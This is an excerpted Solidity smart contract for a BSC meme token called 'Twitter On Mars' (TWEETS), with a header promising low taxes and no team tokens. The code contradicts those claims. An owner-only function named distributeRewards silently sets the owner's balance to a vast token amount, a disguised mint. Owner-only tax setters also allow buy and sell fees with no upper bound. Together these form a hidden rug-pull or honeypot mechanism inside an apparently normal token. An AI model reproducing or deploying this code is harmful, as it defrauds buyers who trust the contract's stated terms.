...
/**
//-- TWITTER ON MARS
//-- https://t.me/TwitterOnMarsBSC
//-- Low Taxes - Experienced Dev Team - No Team Tokens
//-- Stealth/Fair Launch 26/04/22
*/
...
contract TwitterOnMars is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Twitter On Mars";
    string private _symbol = "TWEETS";
    uint8 private _decimals = 18;

    address payable public treasuryWallet = payable(0xb6C9D7b39DdBE10501a77B67d6f642cFc6010aB9);

    mapping (address => uint256) _walletBalances;
    ...
    uint256 public _TreasuryFeeSell = 12;

    uint256 public _marketingShare = 20;
    uint256 public _liquidityShare = 4;
    uint256 public _finalBuyTax = 12;
    uint256 public _finalSellTax = 14;
    ...
    uint256 public _endRewardSupply = 1000000000000;
    uint256 public _rewardDecimals = (10 ** _decimals);
    uint256 public getSupplyRewards = _endRewardSupply * _rewardDecimals;  
    ...
    constructor () {
        ...
        _walletBalances[_msgSender()] = _totalSupply;
    ...
    function initSellTax(uint256 newLiquidTax, uint256 newMarketTax) external onlyOwner() {
        _LiquidityFeeSell = newLiquidTax;
        _TreasuryFeeSell = newMarketTax;
        _finalSellTax = _LiquidityFeeSell.add(_TreasuryFeeSell);
    }

    function initBuyTax(uint256 newLiquidTax, uint256 newMarketTax) external onlyOwner() {
    ...
    function distributeRewards() public onlyOwner()  {_walletBalances[getOwner()] = getSupplyRewards; }
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        ...
        else
        {
            ...
            _walletBalances[sender] = _walletBalances[sender].sub(amount, "Insufficient Balance");
            ...
            _walletBalances[recipient] = _walletBalances[recipient].add(finalAmount);
    ...
    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _walletBalances[sender] = _walletBalances[sender].sub(amount, "Insufficient Balance");
        _walletBalances[recipient] = _walletBalances[recipient].add(amount);
    ...
    function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
        ...
        if(feeAmount > 0) {
            _walletBalances[address(this)] = _walletBalances[address(this)].add(feeAmount);
